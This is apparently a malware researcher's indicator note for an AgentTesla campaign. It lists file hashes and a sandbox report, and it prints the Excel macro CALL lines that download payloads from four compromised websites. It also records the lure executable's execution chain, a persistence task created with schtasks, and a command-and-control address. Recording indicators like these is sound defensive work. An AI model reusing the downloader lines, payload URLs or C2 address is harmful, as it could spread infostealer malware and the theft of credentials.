@@ -1,0 +1,47 @@
+AgentTesla | 2022.06.22
+# --------------------------------------------------------- #
+# ------------------------ SOURCE ------------------------- #
+# --------------------------------------------------------- #
+.exe 43db364531caeb1996b584f1a112eacd54820fcfeb059dfdcab36131b8f79e2d
+.xls c0b609b0a994f32dfd5188ab8ba02e71b8acd30c95c4573c6a5aeebd4e6e01e5
+.dll feca36fa47382c8ce959ae572f627b56ee60c59b3138ba0d5ff77de1f2348e8a
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://www.digitalkhulna.com/wp-admin/L2z2e/", "..\peg1.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://www.dnahealth.gr/wp-content/QkkKMaLwy4jURh6FD/", "..\peg2.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.campusconindigital.org/moodle_old/9giglHrg2t/", "..\peg3.ocx")
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://www.eapro.in/wp-admin/sf2MppPW30cKaWeko/", "..\peg4.ocx")
+
+
+# --------------------------------------------------------- #
+# -------------------- SANDBOX REPORT/S ------------------- #
+# --------------------------------------------------------- #
+https://tria.ge/220614-v6j5ksgbfr
+
+
+# --------------------------------------------------------- #
+# ------------------------ DOMAINS ------------------------ #
+# --------------------------------------------------------- #
+https://www.digitalkhulna.com/wp-admin/L2z2e/
+https://www.dnahealth.gr/wp-content/QkkKMaLwy4jURh6FD/
+http://www.campusconindigital.org/moodle_old/9giglHrg2t/
+http://www.eapro.in/wp-admin/sf2MppPW30cKaWeko/
+
+
+# --------------------------------------------------------- #
+# ----------------------- EXECUTION ----------------------- #
+# --------------------------------------------------------- #
+"C:\Users\Admin\AppData\Local\Temp\Fedex_Shipping Draft_PDF.exe"
+
+    C:\Windows\Microsoft.NET\Framework\v2.0.50727\caspol.exe
+    "C:\Users\Admin\AppData\Local\Temp\Fedex_Shipping Draft_PDF.exe"
+
+    C:\Windows\Microsoft.NET\Framework\v2.0.50727\caspol.exe
+    "C:\Users\Admin\AppData\Local\Temp\Fedex_Shipping Draft_PDF.exe"
+
+        "schtasks.exe" /create /f /tn "DHCP Manager" /xml "C:\Users\Admin\AppData\Local\Temp\tmp36BF.tmp"
+
+
+# --------------------------------------------------------- #
+# -------------------------- C2s -------------------------- #
+# --------------------------------------------------------- #
+config.linkpc.net:3425
